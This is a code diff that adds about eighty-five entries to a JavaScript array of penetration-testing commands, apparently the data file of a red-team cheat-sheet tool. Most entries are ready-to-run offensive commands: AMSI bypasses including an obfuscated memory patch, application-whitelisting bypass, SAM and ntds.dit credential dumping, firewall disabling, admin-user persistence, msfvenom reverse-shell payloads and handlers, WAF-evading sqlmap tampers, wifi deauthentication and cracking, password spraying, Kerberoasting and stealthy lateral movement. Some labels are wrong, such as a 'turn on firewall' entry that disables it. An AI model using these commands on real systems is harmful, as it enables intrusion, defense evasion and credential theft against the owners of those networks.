@@ -453,5 +453,656 @@ var data = [
         "information": "Stops containers and removes containers, networks, volumes, and images created by up",
         "command": "docker-compose down",
     },
-    
+    {
+        "id": 65,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "whitelisting bypass with installutil",
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U [full_path_to_app]",
+    },
+    {
+        "id": 66,
+        "tool": "windows",
+        "category": "PRIVESC",
+        "information": "Find password - group policy preference (ms14-025)",
+        "command": "findstr /S /I cpassword \\[FQDN]\\sysvol\\[FQDN]\\policies\*.xml",
+    },
+    {
+        "id": 67,
+        "tool": "windows",
+        "category": "PRIVESC",
+        "information" : "Show lsa cached credentials",
+        "command": "reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\" ",
+    },
+    {
+        "id": 68,
+        "tool": "windows",
+        "category": "PRIVESC",
+        "information" : "Register query extract SAM",
+        "command": "reg save HKLM\\SAM 'C:\\Windows\\Temp\\sam.save';reg save HKLM\\SECURITY 'C:\\Windows\\Temp\\security.save';reg save HKLM\\SYSTEM 'C:\\Windows\\Temp\\system.save'",
+    },
+    {
+        "id": 69,
+        "tool": "windows",
+        "category": "PRIVESC",
+        "information" : "Find weak folder permission",
+        "command": "accesschk.exe -uwdqs Users <c>:\\",
+    },
+    {
+        "id": 70,
+        "tool": "windows",
+        "category": "PRIVESC",
+        "information" : "Find weak file permission",
+        "command": "accesschk.exe -uwqs Users <c>:\\",
+    },
+    {
+        "id": 71,
+        "tool": "windows",
+        "category": "PERSIST",
+        "information": "Add user",
+        "command": "net user [username] [password] /add",
+    },
+    {
+        "id": 72,
+        "tool": "windows",
+        "category": "PERSIST",
+        "information": "Add user to domain",
+        "command": "net user [username] [password] /add /domain",
+    },
+    {
+        "id": 73,
+        "tool": "windows",
+        "category": "PERSIST",
+        "information": "Add user as admin",
+        "command": "net localgroup administrators [username] /add",
+    },
+    {
+        "id": 74,
+        "tool": "windows",
+        "category": "PERSIST",
+        "information": "Run as over user",
+        "command": "runas /user:[domain]\\[username] [command|cmd.exe]",
+    },
+    {
+        "id": 75,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Infos about password policy",
+        "command": "net accounts",
+    },
+    {
+        "id": 76,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Get domain name",
+        "command": "echo %USERDOMAIN%",
+    },
+    {
+        "id": 77,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Get domain name (2)",
+        "command": "echo %USERSDNSDOMAIN%",
+    },
+    {
+        "id": 78,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Get computer domain name",
+        "command": "systeminfo | findstr /B /C:\"Domain\"",
+    },
+    {
+        "id": 79,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Get name of the DC",
+        "command": "echo %logonserver%",
+    },
+    {
+        "id": 80,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List of group domain",
+        "command": "net group /domain",
+    },
+    {
+        "id": 81,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List of computer connected to the domain",
+        "command": "net group \"domain computers\" /domain",
+    },
+    {
+        "id": 82,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List all PCs of the domain",
+        "command": "net view /domain",
+    },
+    {
+        "id": 83,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List users with domain admin privileges",
+        "command": "net group \"domain admins\" /domain",
+    },
+    {
+        "id": 84,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List all domain users",
+        "command": "net user /domain",
+    },
+    {
+        "id": 85,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Get user domain information",
+        "command": "net user [username] /domain",
+    },
+    {
+        "id": 86,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Print all route",
+        "command": "route print",
+    },
+    {
+        "id": 87,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List of known host",
+        "command": "arp -a",
+    },
+    {
+        "id": 88,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List open port",
+        "command": "netstat -ano",
+    },
+    {
+        "id": 89,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Turn off firewall",
+        "command": "netsh advfirewall set allprofiles state off",
+    },
+    {
+        "id": 90,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Turn on firewall (2)",
+        "command": "netsh firewall set opmode disable",
+    },
+    {
+        "id ": 91,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Dump ntds.dit (Windows >= 2008 server) - method 1",
+        "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
+    },
+    {
+        "id": 92,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Dump ntds.dit (Windows >= 2008 server) - method 2",
+        "command": "esentutl.exe /y /vss c:\\windows\ntds\ntds.dit /d c:\\folder\\ntds.dit",
+    },
+    {
+        "id": 93,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Dump ntds.dit (Windows <= 2003 server)",
+        "command": "net start vss && vssadmin create shadow /for=c: && vssadmin list shadows && copy \\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit C:\\temp",
+    },
+    {
+        "id": 94,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List of conputer shares on the domain",
+        "command": "net view /all /domain [domain_name]",
+    },
+    {
+        "id": 95,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "List share of a computer",
+        "command": "net view \\\\[computer_name] /all",
+    },
+    {
+        "id": 96,
+        "tool": "windows",
+        "category": "RECON",
+        "information": "Mount share locally",
+        "command": "net use [drive_letter]: \\\\[computer_name]\\[share_name]",
+    },
+    {
+        "id": 97,
+        "tool": "powershell",
+        "category": "RECON",
+        "information": "Bypass AMSI with _amsiContext_ (powershell only)",
+        "command": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)",
+    },
+    {
+        "id": 98,
+        "tool": "powershell",
+        "category": "RECON",
+        "information": "Bypass AMSI with _AmsiInitFailed_ (powershell only)",
+        "command": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*InitFailed\") {$f=$e}};$f.SetValue($null,$true)",
+    },
+    {
+        "id": 99,
+        "tool": "powershell",
+        "category": "RECON",
+        "information": "Bypass AMSI by patching (work for .NET binaries too)",
+        "command": "$ZQCUW = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n\r\npublic class ZQCUW {\r\n    [DllImport(\"kernel32\")]\r\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\r\n\r\n    [DllImport(\"kernel32\")]\r\n    public static extern IntPtr LoadLibrary(string name);\r\n\r\n    [DllImport(\"kernel32\")]\r\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\r\n};\r\n\"@\r\n\r\nAdd-Type $ZQCUW;\r\n\r\n$BBWHVWQ = [ZQCUW]::LoadLibrary(\"$([System.Net.WebUtility]::HtmlDecode('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))\");\r\n\r\n$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, \"$([System.Net.WebUtility]::HtmlDecode('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))\");\r\n\r\n$p = 0;\r\n\r\n[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p);\r\n\r\n$TLML = \"0xB8\";\r\n$PURX = \"0x57\";\r\n$YNWL = \"0x00\";\r\n$RTGX = \"0x07\";\r\n$XVON = \"0x80\";\r\n$WRUD = \"0xC3\";\r\n\r\n$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)"
+    },
+    {
+        "id": 100,
+        "tool": "sqlmap",
+        "category": "ATTACK/INJECTION",
+        "information": "SQLMap - classic with tamper",
+        "command": "sqlmap -u '[url]' tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes",
+    },
+    {
+        "id": 101,
+        "tool": "sqlmap",
+        "category": "ATTACK/INJECTION",
+        "information": "SQLMap - mysql tamper list",
+        "command": "sqlmap -u '[url]' --dbms=MYSQL tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes"
+    },
+    {
+        "id": 102,
+        "tool": "sqlmap",
+        "category": "ATTACK/INJECTION",
+        "information": "SQLMap - mssql tamper list",
+        "command": "sqlmap -u '[url]' --dbms=MSSQL tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor"
+    },
+    {
+        "id": 103,
+        "tool": "Metasploit - msf",
+        "category": "ATTACK/CONNECT",
+        "information": "Upgrade session to meterpreter",
+        "command": "sessions -u [session_id]",
+    },
+    {
+        "id": 104,
+        "tool": "Metasploit - msf",
+        "category": "PIVOTING/TUNEL-PORTFW",
+        "information": "Add pivot (autoroute)",
+        "command": "use multi/manage/autoroute",
+    },
+    {
+        "id": 105,
+        "tool": "Metasploit - msf",
+        "category": "PIVOTING/TUNEL-PORTFW",
+        "information": "Add socks proxy (autoroute first)",
+        "command": "use auxiliary/server/socks_proxy",
+    },
+    {
+        "id": 106,
+        "tool": "nmap",
+        "category": "RECON",
+        "information": "Nmap - hosts alive",
+        "command": "nmap -sn [ip_range]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 107,
+        "tool": "nmap",
+        "category": "RECON",
+        "information": "Nmap - classic scan",
+        "command": "nmap -sC -sV [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 108,
+        "tool": "nmap",
+        "category": "RECON",
+        "information": "Nmap - read targets from file",
+        "command": "nmap -iL [file]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 109,
+        "tool": "nmap",
+        "category": "RECON",
+        "information": "Nmap - scan all port full",
+        "command": "nmap -Pn -sC -sV -p [port] [ip] -oN scan.txt --reason --script=vuln",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 110,
+        "tool": "nmap",
+        "category": "RECON",
+        "information": "Nmap - UDP scan",
+        "command": "nmap -sU [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 111,
+        "tool": "masscan",
+        "category": "RECON",
+        "information": "masscan - scan all port",
+        "command": "masscan -p1-65535 [ip] -e [interface] --rate 1000",
+        "link": "https://github.com/robertdavidgraham/masscan"
+    },
+    {
+        "id": 112,
+        "tool": "nmap",
+        "category": "RECON",
+        "information": "Nmap - SMB signin disabled",
+        "command": "nmap -Pn -sS -T4 --open --script smb-security-mode -p 445 [ip]",
+    },
+    {
+        "id": 113,
+        "tool": "wifi",
+        "category": "ATTACK",
+        "information": "airmon - start monitor mode",
+        "command": "airmon-ng start [interface]",
+        "link": "https://www.aircrack-ng.org/"
+    },
+    {
+        "id": 114,
+        "tool": "wifi",
+        "category": "ATTACK",
+        "information": "airodump - capture wifi",
+        "command": "airodump-ng [interface]",
+        "link": "https://www.aircrack-ng.org/"
+    },
+    {
+        "id": 115,
+        "tool": "wifi",
+        "category": "ATTACK",
+        "information": "aireplay - deauth",
+        "command": "aireplay-ng --deauth 0 -a [bssid] [interface]",
+        "link": "https://www.aircrack-ng.org/"
+    },
+    {
+        "id": 116,
+        "tool": "wifi",
+        "category": "ATTACK",
+        "information": "aircrack - crack wifi",
+        "command": "aircrack-ng -w [wordlist] -b [bssid] [file.cap]",
+        "link": "https://www.aircrack-ng.org/"
+    },
+    {
+        "id": 117,
+        "tool": "wifi",
+        "category": "ATTACK",
+        "information": "airbase - fake AP",
+        "command": "airbase-ng -e [ssid] -c [channel] [interface]",
+        "link": "https://www.aircrack-ng.org/"
+    },
+    {
+        "id": 118,
+        "tool": "msfvenom",
+        "category": "ATTACK/REVERSE_SHELL",
+        "information": "msfvenom - payload windows x86 meterpeter unstagged",
+        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe -o [output.exe]",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 119,
+        "tool": "msfvenom",
+        "category": "ATTACK/REVERSE_SHELL",
+        "information": "msfvenom - linux meterpeter reverse shell",
+        "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -o [output.elf]",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 120,
+        "tool": "msfvenom",
+        "category": "ATTACK/REVERSE_SHELL",
+        "information": "msfvenom - Linux x64 meterpreter reverse shell",
+        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -t 300 -e x64/xor_dynamic -o [output.elf]",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 121,
+        "tool": "msfvenom",
+        "category": "ATTACK/REVERSE_SHELL",
+        "information": "msfvenom - PHP meterpreter reverse shell",
+        "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw -o [output.php]",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 122,
+        "tool": "Metasploit - msf",
+        "category": "ATTACK/REVERSE_SHELL",
+        "information": "Metasploit - Handler windows https 64bits stagged - encoded xor",
+        "command": "msfconsole -x \"use exploits/multi/handler; set lhost 192.168.1.0/24; set lport 443; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 123,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate hosts, network",
+        "command": "nxc smb [ip_range]",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 124,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate password policy",
+        "command": "nxc smb 10.10.10.161 -u '[user]' -p '[password]' --pass-pol",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 125,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate null session",
+        "command": "nxc smb [ip] -u '' -p ''",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 125,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate anonymouse login",
+        "command": "nxc smb [ip] -u 'a' -p ''",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 126,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate active session",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' --sessions",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 127,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate domain users",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' --users",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 128,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate users by bruteforce the RID",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' --rid-brute",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 129,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate domain groups",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' --groups",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 130,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate local groups",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' --local-groups",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 131,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate shares",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' --shares",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 132,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate disks",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' --disks",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 133,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate smb target not signed",
+        "command": "nxc smb [ip] --gen-relay-list [smb_targets.txt]",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 134,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - enumerate logged users",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' --loggedon-users",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 135,
+        "tool": "NetExec",
+        "category": "POST-EXPLOITATION",
+        "information": "NetExec - enable wdigest",
+        "command": "nxc smb [ip] -u '[user|Administrator]' -p '[password]' --local-auth --wdigest enable",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 136,
+        "tool": "NetExec",
+        "category": "ATTACK/CONNECT",
+        "information": "NetExec - kerberos auth",
+        "command": "nxc smb [ip] --kerberos",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 137,
+        "tool": "NetExec",
+        "category": "POST-EXPLOITATION",
+        "information": "NetExec - dump SAM",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --sam",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 138,
+        "tool": "NetExec",
+        "category": "POST-EXPLOITATION",
+        "information": "NetExec - dump LSA",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --lsa",
+    },
+    {
+        "id": 139,
+        "tool": "NetExec",
+        "category": "POST-EXPLOITATION",
+        "information": "NetExec - dump NTDS",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --ntds",
+    },
+    {
+        "id": 140,
+        "tool": "NetExec",
+        "category": "POST-EXPLOITATION",
+        "information": "NetExec - dump lsass",
+        "command": "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] -M lsassy",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 141,
+        "tool": "NetExec",
+        "category": "ATTACK/BRUTEFORCE-SPRAY",
+        "information": "NetExec - password spray (user=password)",
+        "command": "nxc smb [dc-ip] -u [user.txt] -p [password.txt] --no-bruteforce --continue-on-success",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 142,
+        "tool": "NetExec",
+        "category": "ATTACK/BRUTEFORCE-SPRAY",
+        "information": "NetExec - password spray multiple test",
+        "command": "nxc smb [dc-ip] -u [user.txt] -p [password.txt] --continue-on-success",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 143,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - ASREP Roasting enum whitout authentication",
+        "command": "nxc ldap [dc-ip] -u [user|user.txt] -p '' --asreproast output.txt",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 144,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - Kerberoasting",
+        "command": "nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting output.txt",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 145,
+        "tool": "NetExec",
+        "category": "RECON",
+        "information": "NetExec - Unconstrained delegation",
+        "command": "nxc ldap [dc-ip] -u [user] -p [password] --trusted-for-delegation",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 146,
+        "tool": "kerbrute",
+        "category": "ATTACK/BRUTEFORCE",
+        "information": "kerbrute - kerberos user enumeration",
+        "command": "kerbrute userenum --dc [dc-ip] -d [domain] [user.txt]",
+        "link": "https://github.com/ropnop/kerbrute"
+    },
+    {
+        "id": 147,
+        "tool": "nmap",
+        "category": "RECON",
+        "information": "Nmap - kerberos user enumeration",
+        "command": "nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=[domain] [dc-ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 148,
+        "tool": "Metasploit - msf",
+        "category": "ATTACK/EXPLOIT",
+        "information": "Metasploit - kerberos ms14-068",
+        "command": "msfconsole -x \"use auxiliary/admin/kerberos/ms14_068_kerberos_checksum\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 149,
+        "tool": "Metasploit - msf",
+        "category": "RECON",
+        "information": "Exploit gpp - Group policy preference (ms14-025)",
+        "command": "msfconsole -x \"use scanner/smb/smb_enum_gpp\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 150,
+        "tool": "SCShell",
+        "category": "ATTACK/CONNECT",
+        "information": "Stealthy psexec",
+        "command": "python3 scshell.py -service-name [service-name|defragsvc] -hashes :[ntlm-hash] [domain]/[user]@[ip]",
+        "link": "https://github.com/Mr-Un1k0d3r/SCShell"
+    }
 ]
